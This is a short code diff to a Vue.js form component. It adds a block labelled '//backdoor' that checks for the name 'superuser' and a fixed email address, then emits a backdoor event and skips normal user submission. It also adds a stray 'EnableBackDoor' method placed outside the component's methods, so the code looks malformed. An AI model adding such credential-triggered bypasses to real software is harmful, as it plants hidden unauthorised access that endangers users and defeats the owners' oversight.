@@ -128,6 +128,12 @@ export default {
       this.alert_formincomplete = false;
       this.uploadingData = true;
 
+      //backdoor
+      if (this.name === "superuser" && this.email === "dduck@disney.com") {
+        this.$emit("EnableBackdoor", "backdoor triggered");
+        return;
+      }
+
       const user = {
         fullName: this.name,
         emailAddress: this.email,
@@ -158,6 +164,9 @@ export default {
         this.alert_fetcherror = true;
       }
     },
+  },
+  EnableBackDoor() {
+    this.$emit("backdoor", true);
   },
 };
 </script>
